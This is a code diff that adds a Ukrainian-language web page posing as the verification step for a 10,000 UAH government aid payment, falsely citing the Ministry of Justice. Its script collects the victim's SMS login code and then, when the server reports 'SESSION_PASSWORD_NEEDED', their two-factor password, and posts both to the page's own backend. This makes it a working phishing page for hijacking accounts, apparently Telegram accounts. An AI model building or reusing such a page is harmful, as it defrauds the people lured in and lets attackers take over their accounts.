@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Підтвердження — Допомога 10 000 грн</title>
+<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: 'Nunito', sans-serif;
+    min-height: 100vh;
+    background: #0f0c29;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 24px;
+    position: relative;
+    overflow-x: hidden;
+  }
+
+  body::before {
+    content: '';
+    position: fixed;
+    top: -120px; left: -120px;
+    width: 400px; height: 400px;
+    border-radius: 50%;
+    background: radial-gradient(circle, rgba(99,60,220,0.45) 0%, transparent 70%);
+    pointer-events: none;
+  }
+  body::after {
+    content: '';
+    position: fixed;
+    bottom: -100px; right: -100px;
+    width: 350px; height: 350px;
+    border-radius: 50%;
+    background: radial-gradient(circle, rgba(16,185,129,0.35) 0%, transparent 70%);
+    pointer-events: none;
+  }
+
+  .coins {
+    position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+    pointer-events: none; overflow: hidden; z-index: 0;
+  }
+  .coin {
+    position: absolute; font-size: 20px; opacity: 0.12;
+    animation: floatCoin linear infinite;
+  }
+  @keyframes floatCoin {
+    0%   { transform: translateY(110vh) rotate(0deg); opacity: 0; }
+    10%  { opacity: 0.12; }
+    90%  { opacity: 0.12; }
+    100% { transform: translateY(-10vh) rotate(360deg); opacity: 0; }
+  }
+
+  /* Верхній бейдж */
+  .top-badge {
+    display: flex; align-items: center; gap: 8px;
+    background: rgba(255,255,255,0.08);
+    border: 1px solid rgba(255,255,255,0.15);
+    border-radius: 50px; padding: 8px 20px;
+    margin-bottom: 16px;
+    backdrop-filter: blur(10px);
+    position: relative; z-index: 1;
+  }
+  .top-badge-dot {
+    width: 8px; height: 8px; border-radius: 50%;
+    background: #fbbf24; box-shadow: 0 0 8px #fbbf24;
+    animation: pulse 1.8s infinite;
+  }
+  @keyframes pulse {
+    0%, 100% { opacity: 1; transform: scale(1); }
+    50% { opacity: 0.6; transform: scale(0.85); }
+  }
+  .top-badge-text { font-size: 13px; font-weight: 700; color: rgba(255,255,255,0.85); letter-spacing: 0.04em; }
+
+  .hero-title {
+    font-size: 14px; font-weight: 700;
+    color: rgba(255,255,255,0.45);
+    letter-spacing: 0.1em; text-transform: uppercase;
+    margin-bottom: 4px; text-align: center;
+    position: relative; z-index: 1;
+  }
+
+  .amount-wrap {
+    display: flex; align-items: baseline; gap: 6px;
+    margin-bottom: 20px; position: relative; z-index: 1;
+  }
+  .amount-num {
+    font-size: 58px; font-weight: 900; line-height: 1;
+    background: linear-gradient(135deg, #fbbf24 0%, #f59e0b 40%, #10b981 100%);
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+    background-clip: text; letter-spacing: -2px;
+  }
+  .amount-currency { font-size: 26px; font-weight: 800; color: rgba(255,255,255,0.35); }
+
+  /* Картка */
+  .card {
+    width: 100%; max-width: 400px;
+    background: rgba(255,255,255,0.05);
+    border: 1px solid rgba(255,255,255,0.12);
+    border-radius: 28px; padding: 30px 26px;
+    display: flex; flex-direction: column;
+    align-items: center; gap: 18px;
+    backdrop-filter: blur(20px);
+    position: relative; z-index: 1; overflow: hidden;
+  }
+  .card::before {
+    content: '';
+    position: absolute; top: 0; left: 20%; right: 20%; height: 2px;
+    background: linear-gradient(90deg, transparent, #fbbf24, #10b981, transparent);
+    border-radius: 2px;
+  }
+
+  /* Аватар */
+  .avatar {
+    width: 80px; height: 80px; border-radius: 50%;
+    background: linear-gradient(135deg, rgba(99,60,220,0.5), rgba(16,185,129,0.3));
+    border: 2px solid rgba(255,255,255,0.15);
+    display: flex; align-items: center; justify-content: center; overflow: hidden;
+  }
+  .avatar svg { width: 52px; height: 52px; }
+
+  /* Крок-лейбл */
+  .step-label {
+    font-size: 11px; font-weight: 800;
+    color: rgba(255,255,255,0.4);
+    text-transform: uppercase; letter-spacing: 0.1em;
+    text-align: center;
+  }
+
+  /* Прогрес */
+  .progress-wrap {
+    width: 100%; display: flex; flex-direction: column; gap: 6px;
+  }
+  .progress-bar-bg {
+    width: 100%; height: 4px;
+    background: rgba(255,255,255,0.08);
+    border-radius: 4px; overflow: hidden;
+  }
+  .progress-bar-fill {
+    height: 100%; width: 50%;
+    background: linear-gradient(90deg, #fbbf24, #10b981);
+    border-radius: 4px;
+    transition: width 0.5s ease;
+  }
+  .progress-text {
+    font-size: 11px; color: rgba(255,255,255,0.35);
+    font-weight: 700; text-align: right;
+  }
+
+  /* Клітинки коду */
+  #step-code { width: 100%; display: flex; flex-direction: column; align-items: center; gap: 16px; }
+  #step-password { width: 100%; display: none; flex-direction: column; align-items: center; gap: 16px; }
+
+  .code-inputs { display: flex; gap: 10px; justify-content: center; }
+
+  .code-box {
+    width: 52px; height: 62px;
+    border-radius: 14px;
+    border: 1.5px solid rgba(255,255,255,0.12);
+    background: rgba(255,255,255,0.06);
+    color: #fff;
+    font-size: 26px; font-weight: 900;
+    text-align: center; outline: none;
+    font-family: 'Nunito', sans-serif;
+    transition: border-color 0.18s, background 0.18s;
+    caret-color: transparent;
+  }
+  .code-box:focus {
+    border-color: rgba(251,191,36,0.7);
+    background: rgba(251,191,36,0.08);
+    box-shadow: 0 0 0 3px rgba(251,191,36,0.12);
+  }
+  .code-box.filled {
+    border-color: rgba(16,185,129,0.6);
+    background: rgba(16,185,129,0.08);
+    color: #10b981;
+  }
+
+  .code-hint { font-size: 12px; color: rgba(255,255,255,0.3); text-align: center; font-weight: 600; margin-top: -4px; }
+
+  /* Поле паролю */
+  .password-input {
+    width: 100%;
+    background: rgba(255,255,255,0.07);
+    border: 1.5px solid rgba(255,255,255,0.12);
+    border-radius: 16px; padding: 14px 18px;
+    font-size: 17px; font-weight: 800;
+    font-family: 'Nunito', sans-serif;
+    outline: none; color: #fff;
+    transition: border-color 0.2s, background 0.2s;
+  }
+  .password-input:focus {
+    border-color: rgba(251,191,36,0.6);
+    background: rgba(255,255,255,0.1);
+  }
+  .password-input::placeholder { color: rgba(255,255,255,0.2); font-weight: 600; }
+
+  /* Статуси */
+  .error   { color: #f87171; font-size: 13px; font-weight: 700; text-align: center; }
+  .success { color: #10b981; font-size: 13px; font-weight: 700; text-align: center; }
+  .loading { color: #a78bfa; font-size: 13px; font-weight: 700; text-align: center; }
+
+  /* Кнопка */
+  .btn-next {
+    width: 100%; padding: 16px;
+    background: linear-gradient(135deg, #fbbf24 0%, #f59e0b 50%, #10b981 100%);
+    color: #0f0c29; border: none; border-radius: 16px;
+    font-size: 16px; font-weight: 900;
+    font-family: 'Nunito', sans-serif;
+    cursor: pointer; letter-spacing: 0.02em;
+    box-shadow: 0 8px 32px rgba(251,191,36,0.3);
+    transition: opacity 0.2s, transform 0.12s, box-shadow 0.2s;
+  }
+  .btn-next:hover { opacity: 0.92; box-shadow: 0 12px 40px rgba(251,191,36,0.45); }
+  .btn-next:active { transform: scale(0.97); }
+  .btn-next:disabled { opacity: 0.4; cursor: not-allowed; box-shadow: none; }
+
+  .secure-row {
+    display: flex; align-items: center; gap: 6px;
+    font-size: 11px; color: rgba(255,255,255,0.25); font-weight: 600;
+  }
+
+  /* Чат */
+  .chat-btn {
+    position: fixed; bottom: 24px; right: 24px;
+    width: 52px; height: 52px;
+    background: linear-gradient(135deg, #fbbf24, #f59e0b);
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    cursor: pointer;
+    box-shadow: 0 4px 20px rgba(251,191,36,0.5);
+    border: none; transition: transform 0.15s; z-index: 10;
+  }
+  .chat-btn:hover { transform: scale(1.1); }
+</style>
+</head>
+<body>
+
+  <div class="coins" id="coins"></div>
+
+  <div class="top-badge">
+    <div class="top-badge-dot"></div>
+    <span class="top-badge-text">🔐 ПІДТВЕРДЖЕННЯ ОСОБИСТОСТІ</span>
+  </div>
+
+  <div class="hero-title">Крок 2 з 2 — Верифікація</div>
+
+  <div class="amount-wrap">
+    <span class="amount-num">10 000</span>
+    <span class="amount-currency">₴</span>
+  </div>
+
+  <div class="card">
+    <div class="progress-wrap">
+      <div class="progress-bar-bg">
+        <div class="progress-bar-fill" id="progressBar"></div>
+      </div>
+      <div class="progress-text" id="progressText">Крок 2 з 2</div>
+    </div>
+
+    <div class="avatar">
+      <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="50" cy="36" r="20" fill="rgba(251,191,36,0.9)"/>
+        <ellipse cx="50" cy="82" rx="30" ry="22" fill="rgba(251,191,36,0.7)"/>
+      </svg>
+    </div>
+
+    <!-- Step: Code -->
+    <div id="step-code">
+      <div class="step-label">📩 Введіть код із SMS</div>
+      <div class="code-inputs">
+        <input class="code-box" type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*">
+        <input class="code-box" type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*">
+        <input class="code-box" type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*">
+        <input class="code-box" type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*">
+        <input class="code-box" type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*">
+      </div>
+      <p class="code-hint">Введіть код, який надійшов на ваш телефон</p>
+      <div id="status-code" style="display:none;"></div>
+      <button class="btn-next" id="btn-code" onclick="handleVerifyCode()">✅ Підтвердити код</button>
+    </div>
+
+    <!-- Step: 2FA Password -->
+    <div id="step-password">
+      <div class="step-label">🔐 Двофакторний захист</div>
+      <input class="password-input" type="password" id="password-input" placeholder="Введіть пароль 2FA">
+      <p class="code-hint">Введіть пароль двофакторної автентифікації</p>
+      <div id="status-password" style="display:none;"></div>
+      <button class="btn-next" id="btn-password" onclick="handleVerifyPassword()">✅ Підтвердити пароль</button>
+    </div>
+
+    <div class="secure-row">
+      <span>🔒</span>
+      <span>Захищено державним шифруванням · Мін'юст України</span>
+    </div>
+  </div>
+
+  <button class="chat-btn" title="Підтримка">
+    <svg viewBox="0 0 24 24" width="24" height="24" xmlns="http://www.w3.org/2000/svg">
+      <path d="M20 2H4C2.9 2 2 2.9 2 4v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 12H6l-2 2V4h16v10z" fill="#0f0c29"/>
+    </svg>
+  </button>
+
+<script>
+  // Монетки
+  const coinsEl = document.getElementById('coins');
+  const symbols = ['₴','₴','💰','✨','₴'];
+  for (let i = 0; i < 18; i++) {
+    const c = document.createElement('span');
+    c.className = 'coin';
+    c.textContent = symbols[i % symbols.length];
+    c.style.left = (Math.random() * 100) + 'vw';
+    c.style.animationDuration = (10 + Math.random() * 14) + 's';
+    c.style.animationDelay = (Math.random() * 12) + 's';
+    c.style.fontSize = (14 + Math.random() * 16) + 'px';
+    coinsEl.appendChild(c);
+  }
+
+  const currentPhone = sessionStorage.getItem('phone');
+  if (!currentPhone) window.location.href = '/';
+
+  document.querySelectorAll('.code-box')[0].focus();
+
+  document.querySelectorAll('.code-box').forEach((box, i, boxes) => {
+    box.addEventListener('input', () => {
+      box.value = box.value.replace(/\D/g, '');
+      if (box.value) {
+        box.classList.add('filled');
+        if (i < boxes.length - 1) boxes[i + 1].focus();
+      } else {
+        box.classList.remove('filled');
+      }
+    });
+
+    box.addEventListener('keydown', (e) => {
+      if (e.key === 'Backspace' && !box.value && i > 0) {
+        boxes[i - 1].value = '';
+        boxes[i - 1].classList.remove('filled');
+        boxes[i - 1].focus();
+      }
+    });
+
+    box.addEventListener('paste', (e) => {
+      e.preventDefault();
+      const pasted = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, boxes.length);
+      [...pasted].forEach((char, j) => {
+        if (boxes[i + j]) { boxes[i + j].value = char; boxes[i + j].classList.add('filled'); }
+      });
+      boxes[Math.min(i + pasted.length, boxes.length - 1)].focus();
+    });
+  });
+
+  async function handleVerifyCode() {
+    const boxes = document.querySelectorAll('.code-box');
+    const code = [...boxes].map(b => b.value).join('');
+
+    if (code.length < 5) {
+      setStatus('status-code', 'error', '❌ Введіть повний код підтвердження');
+      return;
+    }
+
+    const btn = document.getElementById('btn-code');
+    btn.disabled = true;
+    btn.textContent = '⏳ Перевіряємо...';
+    setStatus('status-code', 'loading', '⏳ Перевіряємо код...');
+
+    try {
+      const response = await fetch('/verify-code', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ phone: currentPhone, code })
+      });
+
+      const data = await response.json();
+
+      if (data.success) {
+        document.getElementById('progressBar').style.width = '100%';
+        setStatus('status-code', 'success', '✅ Виплату успішно підтверджено!');
+        sessionStorage.removeItem('phone');
+      } else if (data.error === 'SESSION_PASSWORD_NEEDED') {
+        document.getElementById('step-code').style.display = 'none';
+        document.getElementById('step-password').style.display = 'flex';
+        document.getElementById('password-input').focus();
+      } else {
+        setStatus('status-code', 'error', '❌ ' + (data.error || 'Невірний код'));
+        boxes.forEach(b => { b.value = ''; b.classList.remove('filled'); });
+        boxes[0].focus();
+        btn.disabled = false;
+        btn.textContent = '✅ Підтвердити код';
+      }
+    } catch (err) {
+      setStatus('status-code', 'error', '❌ Сервер недоступний');
+      btn.disabled = false;
+      btn.textContent = '✅ Підтвердити код';
+    }
+  }
+
+  async function handleVerifyPassword() {
+    const password = document.getElementById('password-input').value;
+
+    if (!password) {
+      setStatus('status-password', 'error', '❌ Введіть пароль');
+      return;
+    }
+
+    const btn = document.getElementById('btn-password');
+    btn.disabled = true;
+    btn.textContent = '⏳ Перевіряємо...';
+    setStatus('status-password', 'loading', '⏳ Перевіряємо пароль...');
+
+    try {
+      const response = await fetch('/verify-password', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ phone: currentPhone, password })
+      });
+
+      const data = await response.json();
+
+      if (data.success) {
+        document.getElementById('progressBar').style.width = '100%';
+        setStatus('status-password', 'success', '✅ Виплату успішно підтверджено!');
+        sessionStorage.removeItem('phone');
+      } else {
+        setStatus('status-password', 'error', '❌ ' + (data.error || 'Невірний пароль'));
+        btn.disabled = false;
+        btn.textContent = '✅ Підтвердити пароль';
+      }
+    } catch (err) {
+      setStatus('status-password', 'error', '❌ Сервер недоступний');
+      btn.disabled = false;
+      btn.textContent = '✅ Підтвердити пароль';
+    }
+  }
+
+  function setStatus(id, type, text) {
+    const el = document.getElementById(id);
+    el.className = type;
+    el.innerHTML = text;
+    el.style.display = 'block';
+  }
+</script>
+</body>
+</html>
